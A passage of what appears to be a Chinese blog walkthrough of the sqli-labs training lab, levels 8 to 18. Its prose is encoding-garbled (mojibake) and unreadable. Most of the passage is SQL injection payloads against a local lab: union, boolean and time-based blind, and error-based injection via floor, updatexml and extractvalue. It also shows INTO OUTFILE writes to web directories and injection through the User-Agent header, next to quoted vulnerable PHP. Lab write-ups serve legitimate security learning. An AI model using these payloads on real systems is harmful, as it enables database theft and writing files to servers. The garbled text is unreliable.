ï¼Œè¡¨ç¤ºé™åˆ¶mysqld çš„å¯¼å…¥|å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨&#x2F;tmp&#x2F;ç›®å½•ä¸‹</p></li><li><p>å½“secure_file_privçš„å€¼æ²¡æœ‰å…·ä½“å€¼æ—¶ï¼Œè¡¨ç¤ºä¸å¯¹mysqld çš„å¯¼å…¥|å¯¼å‡ºåšé™åˆ¶</p></li></ul><p>windowsä¸‹ï¼šä¿®æ”¹my.ini åœ¨[mysqld]å†…åŠ å…¥secure_file_priv &#x3D;</p><p>linuxä¸‹ï¼šä¿®æ”¹my.cnf åœ¨[mysqld]å†…åŠ å…¥secure_file_priv &#x3D;<br>ç„¶åé‡å¯mysqlå³å¯</p><p><strong>å‚è€ƒï¼š</strong> </p><ul><li><a href="https://segmentfault.com/a/1190000009333563">MYSQLæ–°ç‰¹æ€§secure_file_privå¯¹è¯»å†™æ–‡ä»¶çš„å½±å“</a>  </li><li><a href="https://shockerli.net/post/mysql-secure-file-priv/">MySQL å…¨å±€é…ç½® â€“secure-file-priv</a>  </li><li><a href="https://www.cnblogs.com/tangjf10/p/12602116.html">sqli-labsï¼šLess-7</a></li></ul><h3 id="level-8"><a href="#level-8" class="headerlink" title="level-8"></a>level-8</h3><p><strong>å•å¼•å·-ç›²æ³¨</strong><br>çˆ†å­—æ®µæ•°  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">8</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;  order by 3%23</span></span><br><span class="line"><span class="string">```  </span></span><br><span class="line"><span class="string">1ã€æ–‡ä»¶å†™å…¥  </span></span><br><span class="line"><span class="string">åŸç†åŒ`level-7`</span></span><br><span class="line"><span class="string">``` python</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-8/?id=1&#x27;</span>  union select <span class="number">1</span>,<span class="number">0x74657374</span>,<span class="number">3</span> into outfile <span class="string">&quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-8\\test.php&quot;</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure><p>2ã€å¸ƒå°”æ³¨å…¥<br>åŸç†åŒlevel-5ï¼Œä»…æµ‹è¯•åº“åé•¿åº¦ï¼Œä¸å…·ä½“å±•ç¤º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">8</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; or length(database())=8  %23</span></span><br></pre></td></tr></table></figure><p>å·¥å…·ï¼š<a href="https://github.com/HuDeshui/tools/blob/main/sqli_labs/sqli-labs-level-8.py"><strong>çˆ†ç ´è„šæœ¬</strong></a></p><h3 id="level-9"><a href="#level-9" class="headerlink" title="level-9"></a>level-9</h3><p><strong>åŸºäºæ—¶é—´-å•å¼•å·-å¸ƒå°”-æ³¨å…¥&#x2F;æ–‡ä»¶å†™å…¥</strong><br>1ã€åŸºäºæ—¶é—´çš„å¸ƒå°”æ³¨å…¥<br>åŸç†ç±»ä¼¼äºåŸºäºæŠ¥é”™ï¼Œè¿™é‡Œåªä¸€ä¸ªçˆ†æ•°æ®åº“é•¿åº¦çš„è¯­å¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">9</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; and if((length(database())=8),sleep(2),null) %23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-9/?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">if</span>((payload),sleep(<span class="number">2</span>),null) %<span class="number">23</span></span><br></pre></td></tr></table></figure><p>2ã€æ–‡ä»¶å†™å…¥<br>å¯ä»¥å…ˆç”¨å¸ƒå°”ç›²æ³¨æµ‹å‡ºå½“å‰è¡¨çš„å­—æ®µæ•°ï¼Œç„¶åä½¿ç”¨unionå†™å¦‚æ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hhttp://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">9</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;  union select 1,0x74657374,3 into outfile &quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-9\\test.php&quot; %23</span></span><br></pre></td></tr></table></figure><p>æœ¬æ¥æƒ³ç”¨ä¸‹é¢è¯­å¥ä¸­çš„payloadå†™å…¥æ–‡ä»¶ï¼Œä½†æ˜¯ä¸€ç›´ä¸æˆåŠŸï¼Œç†è§£ä¸º<code>into outfile PATH</code>æ˜¯æœ€åç»“æœçš„è¾“å‡ºï¼Œä¸èƒ½ç”¨åœ¨è¯­å¥ä¸­é—´ï¼Œæ‰€ä»¥è¿˜æ˜¯è¦ç»“åˆ<code>union</code>è”åˆè¾“å‡º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">9</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; and if(1,(payload),null) %23</span></span><br></pre></td></tr></table></figure><h3 id="level-10"><a href="#level-10" class="headerlink" title="level-10"></a>level-10</h3><p><strong>åŸºäºæ—¶é—´-åŒå¼•å·-å¸ƒå°”-æ³¨å…¥&#x2F;æ–‡ä»¶å†™å…¥</strong><br>åŒlevel-9ï¼Œä¸è¿‡æ¢æˆåŒå¼•å·äº†ï¼Œä¸ç»†è‡´å±•å¼€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">10</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&quot; and if((length(database())=8),sleep(2),null)%23</span></span><br></pre></td></tr></table></figure><h3 id="level-11"><a href="#level-11" class="headerlink" title="level-11"></a>level-11</h3><p><strong>POSTå‹-å•å¼•å·-æœ‰å›æ˜¾-æ³¨å…¥</strong>  </p><p>ç®€å•æµ‹è¯•ä¸€ä¸‹<br>username&#x3D;aâ€™,password&#x3D;bâ€™<br><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;b&#39;&#39; LIMIT 0,1&#39; at line 1</code><br>å¯ä»¥çŒœå‡ºåå°çš„è¯­å¥å°±æ˜¯å¾ˆç›´æ¥çš„é‚£ç§ï¼ŒæŸ¥çœ‹åå°ä»£ç ï¼Œç¡®å®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">   <span class="variable">$uname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;User Name:&#x27;</span>.<span class="variable">$uname</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;Password:&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure><p>ç±»ä¼¼äºlevel-1ï¼Œé—­åˆè¯­å¥å°±å¯ä»¥<br>burpæŠ“åŒ…æµ‹è¯•<br>çˆ†å­—æ®µæ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">postæ•°æ®</span><br><span class="line">uname=<span class="number">1</span><span class="string">&#x27;or 1 order by 1 #&amp;passwd=b&amp;submit=Submit  çˆ†å‡ºå­—æ®µæ•°2</span></span><br><span class="line"><span class="string">åç«¯åŠ å·¥ä¹‹å</span></span><br><span class="line"><span class="string">SELECT username, password FROM users WHERE username=&#x27;</span><span class="number">1</span><span class="string">&#x27;or 1 order by 1 #&#x27;</span> <span class="keyword">and</span> password=<span class="string">&#x27;b&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span> æˆåŠŸç»•è¿‡</span><br></pre></td></tr></table></figure><p>çˆ†æ•°æ®åº“</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">postæ•°æ®</span><br><span class="line">uname=-<span class="number">1</span><span class="string">&#x27; union select 1,2 #&amp;passwd=b&amp;submit=Submit</span></span><br><span class="line"><span class="string">åç«¯åŠ å·¥å</span></span><br><span class="line"><span class="string">SELECT username, password FROM users WHERE username=&#x27;</span>-<span class="number">1</span><span class="string">&#x27; union select 1,2 #&#x27;</span> <span class="keyword">and</span> password=<span class="string">&#x27;b&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span> </span><br><span class="line">å›æ˜¾ï¼Œå¯ä»¥çœ‹ä¹¦<span class="number">1</span>ï¼Œ<span class="number">2</span>éƒ½å¯åˆ©ç”¨</span><br><span class="line">&lt;br&gt;Your Login name:<span class="number">1</span>&lt;br&gt;Your Password:<span class="number">2</span>&lt;br&gt;</span><br></pre></td></tr></table></figure><p>åé¢åŒç†å‰é¢çš„levelï¼Œä¸ç»†è‡´å±•å¼€äº†</p><h3 id="level-12"><a href="#level-12" class="headerlink" title="level-12"></a>level-12</h3><p><strong>POSTå‹-åŒå¼•å·-å•æ‹¬å·-æœ‰å›æ˜¾-æ³¨å…¥</strong><br>ç®€å•æµ‹è¯•<br><code>uname=a&quot;&amp;passwd=b&#39;#&amp;submit=Submit</code><br>å›æ˜¾,æ ¹æ®ä¹‹å‰æ€»ç»“çš„è§„å¾‹ï¼Œçœ‹å‡ºå°±æ˜¯idåŠ åŒå¼•å·åŠ å•æ‹¬å·ï¼Œç”¨aéªŒè¯ï¼Œçœ‹äº†åå°ç¡®å®æ˜¯<br><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;b&#39;#&quot;) LIMIT 0,1&#39; at line 1</code><br>çˆ†å­—æ®µæ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=a<span class="string">&quot;)or 1 order by 1#&amp;passwd=b&#x27;#&amp;submit=Submit çˆ†å‡ºå­—æ®µæ•°ä¸º2</span></span><br><span class="line"><span class="string">åç«¯sql</span></span><br><span class="line"><span class="string">SELECT username, password FROM users WHERE username=(&quot;</span>a<span class="string">&quot;)or 1 order by 1#&quot;</span>) <span class="keyword">and</span> password=(<span class="string">&quot;b&#x27;#&quot;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹å¯åˆ©ç”¨å­—æ®µï¼Œçˆ†æ•°æ®åº“å </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=a&quot;) union select 1,database()#&amp;passwd=b&#x27;#&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>ä¸‹é¢å°±å’Œå‰é¢çš„levelä¸€æ ·äº†ï¼Œä¸ç»†è‡´å±•å¼€äº†</p><h3 id="level-13"><a href="#level-13" class="headerlink" title="level-13"></a>level-13</h3><p><strong>POSTå‹-åŒå¼•å·-å•æ‹¬å·-æ— å›æ˜¾-å¸ƒå°”&#x2F;æŠ¥é”™æ³¨å…¥</strong><br>åˆ†ææŠ¥é”™</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=a<span class="string">&#x27;&amp;passwd=b&#x27;</span><span class="comment">#&amp;submit=Submit</span></span><br><span class="line">å›æ˜¾ï¼Œæ ¹æ®è§„å¾‹å¾—å‡ºï¼Œåç«¯åŠ å•å¼•å·ï¼Œå•æ‹¬å·</span><br><span class="line">You have an error <span class="keyword">in</span> your SQL syntax; check the manual that corresponds to your MySQL server version <span class="keyword">for</span> the right syntax to use near <span class="string">&#x27;b&#x27;</span><span class="string">&#x27;) LIMIT 0,1&#x27;</span> at line <span class="number">1</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å’Œä¹‹å‰ä¸€æ ·äº†   </p><p>1ã€æŠ¥é”™æ³¨å…¥<br><strong>floor</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=<span class="number">1</span><span class="string">&#x27;) or (select 1 from (select count(*),concat(0x7e,(database()),0x7e,floor (rand(0)*2))x from information_schema.tables group by x)a)#&amp;passwd=q&amp;submit=Submit</span></span><br><span class="line"><span class="string">å›æ˜¾ï¼Œå…·ä½“ä¸å±•å¼€å’Œä¹‹å‰ä¸€æ ·</span></span><br><span class="line"><span class="string">Duplicate entry &#x27;</span>~security~<span class="number">1</span><span class="string">&#x27; for key &#x27;</span>group_key<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>updatexml</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=<span class="number">1</span><span class="string">&#x27;) or updatexml(1,concat(0x7e,(database()),0x7e),1)#&amp;passwd=q&amp;submit=Submit</span></span><br><span class="line"><span class="string">å›æ˜¾</span></span><br><span class="line"><span class="string">XPATH syntax error: &#x27;</span>~security~<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>extractvalue</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=<span class="number">1</span><span class="string">&#x27;) or extractvalue(1, concat(0x7e,(database()),0x7e))#&amp;passwd=q&amp;submit=Submit</span></span><br><span class="line"><span class="string">å›æ˜¾</span></span><br><span class="line"><span class="string">XPATH syntax error: &#x27;</span>~security~<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>2ã€å¸ƒå°”æ³¨å…¥<br>ä»…ä½œåº“åé•¿åº¦æ¼”ç¤º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=<span class="number">1</span><span class="string">&#x27;) or length(database())=8#&amp;passwd=q&amp;submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">å›æ˜¾ï¼Œè¿™é‡ŒæŸ¥çœ‹æºç æˆåŠŸçš„å›¾ç‰‡åæ˜¯/images/flag.jpgï¼Œå¤±è´¥çš„ä¸º /images/slap.jpg</span></span><br><span class="line"><span class="string">å¯ä»¥æ ¹æ®æ–‡ä»¶åé€ä¸€çˆ†ç ´ï¼Œä¸ä¸€ä¸€å±•å¼€ï¼Œå’Œä¹‹å‰ä¸€æ ·ã€‚</span></span><br></pre></td></tr></table></figure><h3 id="level-14"><a href="#level-14" class="headerlink" title="level-14"></a>level-14</h3><p><strong>POSTå‹-åŒå¼•å·-æ— å›æ˜¾-å¸ƒå°”&#x2F;æŠ¥é”™æ³¨å…¥</strong>   </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=<span class="number">1</span><span class="string">&quot;&amp;passwd=2&amp;submit=Submit</span></span><br><span class="line"><span class="string">å›æ˜¾ï¼Œæ¨æ–­åç«¯åŠ äº†åŒå¼•å·</span></span><br><span class="line"><span class="string">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;2&quot;</span> LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27; at line 1</span></span><br></pre></td></tr></table></figure><p>å’Œlevel-13åŸç†ä¸€æ ·ï¼Œåªæ˜¯åç«¯å°‘åŠ äº†å•æ‹¬å·ï¼Œä¸ç»†è‡´å±•å¼€ã€‚</p><h3 id="level-15"><a href="#level-15" class="headerlink" title="level-15"></a>level-15</h3><p><strong>POSTå‹-å•å¼•å·-æ— å›æ˜¾-å¸ƒå°”&#x2F;æ—¶é—´ç›²æ³¨&#x2F;æ–‡ä»¶å†™å…¥</strong><br>è¿™é‡Œå‘ç°å¯ä»¥å¸ƒå°”æ³¨å…¥å°±ä¸€å®šå¯ä»¥æ—¶é—´ç›²æ³¨ï¼Œè¿™é‡Œå› ä¸ºæˆåŠŸ&#x2F;å¤±è´¥å›¾ç‰‡åä¸ä¸€æ ·ï¼Œç”¨å¸ƒå°”æ›´å¿«ä¸€äº›<br>çŒœæµ‹åå°åŠ å·¥ï¼šåŠ å•å¼•å·ï¼Œæµ‹è¯•<code>username=a&#39; or 1#</code> ï¼Œå›æ˜¾æˆåŠŸ<br>1ã€å¸ƒå°”&#x2F;æ—¶é—´ç›²æ³¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST data </span><br><span class="line">å¸ƒå°”ï¼š</span><br><span class="line">uname=a<span class="string">&#x27; or length(database())=8#&amp;passwd=a&amp;submit=Submit</span></span><br><span class="line"><span class="string">æ—¶é—´ç›²æ³¨ï¼š</span></span><br><span class="line"><span class="string">uname=a&#x27;</span> <span class="keyword">or</span> <span class="keyword">if</span>((length(database())=<span class="number">8</span>),sleep(<span class="number">2</span>),null)<span class="comment">#&amp;passwd=a&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><p>2ã€æ–‡ä»¶å†™å…¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=a<span class="string">&#x27; union select 1,0x7e into outfile &quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-15\\test.txt&quot;#&amp;passwd=a&amp;submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">test.txtå†…å®¹</span></span><br><span class="line"><span class="string">1~</span></span><br></pre></td></tr></table></figure><p>å…·ä½“ä¸å±•å¼€ï¼Œå’Œä¹‹å‰ä¸€æ ·</p><h3 id="level-16"><a href="#level-16" class="headerlink" title="level-16"></a>level-16</h3><p><strong>POSTå‹-åŒå¼•å·-å•æ‹¬å·-æ— å›æ˜¾-å¸ƒå°”&#x2F;æ—¶é—´ç›²æ³¨&#x2F;æ–‡ä»¶å†™å…¥</strong><br>åŒlevel-15ï¼ŒæŠŠidæ”¹ä¸€ä¸‹å³å¯ï¼Œåç«¯åŠ å·¥ä¸º æ·»åŠ  <code>&quot;)</code>ï¼Œä¸å…·ä½“å±•å¼€äº†</p><h3 id="level-17"><a href="#level-17" class="headerlink" title="level-17"></a>level-17</h3><p><strong>æœ‰è½¬ä¹‰-updateå‡½æ•°-å•å¼•å·-å¸ƒå°”&#x2F;æŠ¥é”™æ³¨å…¥</strong><br>è¿™ä¸€çº§ç”¨äº†æ–°å‡½æ•°ï¼Œè¦update<br>æˆ‘ä»¬çœ‹ä¸€ä¸‹åç«¯å…³é”®ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$uname</span>=<span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);  <span class="comment">#check_inputä¼šè½¬ä¹‰å•å¼•å·ï¼Œæ‰€ä»¥adminä¸å¥½åˆ©ç”¨</span></span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]; <span class="comment">#passwdæ²¡æœ‰è¢«è½¬ä¹‰</span></span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username= <span class="subst">$uname</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="comment">//echo $row;</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$row1</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];  </span><br><span class="line"><span class="variable">$update</span>=<span class="string">&quot;UPDATE users SET password = &#x27;<span class="subst">$passwd</span>&#x27; WHERE username=&#x27;<span class="subst">$row1</span>&#x27;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸»è¦æ˜¯é—­åˆupdateè¯­å¥ï¼Œè¿™é‡Œä»…å±•ç¤ºçˆ†æ•°æ®åº“åé•¿åº¦ï¼Œåé¢ä¸ä¸€ä¸€å±•ç¤º<br>1ã€æŠ¥é”™æ³¨å…¥<br>floor</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=admin&amp;passwd=<span class="string">b&#x27;or (select 1 from (select count(*),concat(0x7e,(database()),0x7e,floor (rand(0)*2))x from information_schema.tables group by x)a)#&amp;submit=Submit</span></span><br><span class="line"><span class="string">å›æ˜¾</span></span><br><span class="line"><span class="string">Duplicate entry &#x27;</span>~security~<span class="number">1</span><span class="string">&#x27; for key &#x27;</span>group_key<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>updatexml</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=admin&amp;passwd=<span class="string">b&#x27;or updatexml(1,concat(0x7e,(database()),0x7e),1)#&amp;submit=Submit</span></span><br><span class="line"><span class="string">å›æ˜¾</span></span><br><span class="line"><span class="string">&gt;XPATH syntax error: &#x27;</span>~security~</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=admin&amp;passwd=<span class="string">b&#x27;or extractvalue(1, concat(0x7e,(database()),0x7e))#&amp;submit=Submit</span></span><br><span class="line"><span class="string">å›æ˜¾</span></span><br><span class="line"><span class="string">&gt;XPATH syntax error: &#x27;</span>~security~</span><br></pre></td></tr></table></figure><p>2ã€æ—¶é—´ç›²æ³¨<br>ä»…å±•ç¤ºçˆ†æ•°æ®åº“é•¿åº¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=admin&amp;passwd=<span class="string">b&#x27;or if(length(database()=8),sleep(2),null)#&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><h3 id="level-18"><a href="#level-18" class="headerlink" title="level-18"></a>level-18</h3><p><strong>è¯·æ±‚å¤´ï¼ˆUser-Agenï¼‰-æ³¨å…¥-æŠ¥é”™&#x2F;æ—¶é—´æ³¨å…¥</strong><br>çœ‹äº†åç«¯æºç ï¼ŒåŠ äº†è¿‡æ»¤ï¼Œåªèƒ½æ³¨å…¥hearé‡Œçš„user-agent<br>å…³é”®ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$uagent = $_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">$uname = check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">$insert=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;</span>;</span><br></pre></td></tr></table></figure><p>å¯æ§çš„æ˜¯<code>uagent</code> ã€<code>uname</code>,unameå› ä¸ºå¿…é¡»æ˜¯è¡¨é‡Œçš„ï¼Œæ‰€ä»¥ä¸èƒ½åˆ©ç”¨ï¼Œå¯ä»¥åˆ©ç”¨uagentå³        <code>HTTP_USER_AGENT</code>  </p><p>åˆ†æè¯­å¥,æ‹¼æ¥,è¿™é‡Œæœ¬ä»¥ä¸ºæŠ¥é”™æ³¨å…¥åªéœ€è¦æŠŠå¥å­æ”¾åœ¨æœ€åå°±è¡Œäº†ï¼Œå‘ç°ä¸è¡Œ<br>åªæœ‰æ”¾åœ¨å‚æ•°ä½ç½®æ‰å¯ä»¥äº§ç”ŸæŠ¥é”™<br>1ã€æŠ¥é”™æ³¨å…¥ ï¼Œä»…çˆ†åº“å<br><strong>floor</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST DATA</span><br><span class="line">uname=admin&amp;passwd=<span class="number">0</span>&amp;submit=Submit</span><br><span class="line">User-Agent: aaa<span class="string">&#x27; or (select 1 from (select count(*),concat(0x7e,(database()),0x7e,floor (rand(0)*2))x from information_schema.tables group by x)a), &#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;)#</span></span><br><span class="line"><span class="string">æ‹¼æ¥å</span></span><br><span class="line"><span class="string">INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;</span>aaa<span class="string">&#x27; or (select 1 from (select count(*),concat(0x7e,(database()),0x7e,floor (rand(0)*2))x from information_schema.tables group by x)a), &#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;)#&#x27;</span>, <span class="string">&#x27;192.168.8.107&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">å›æ˜¾</span><br><span class="line">Duplicate entry <span class="string">&#x27;~security~1&#x27;</span> <span class="keyword">for</span> key <span class="string">&#x27;group_key&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>updatexml</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST DATA</span><br><span class="line">uname=admin&amp;passwd=<span 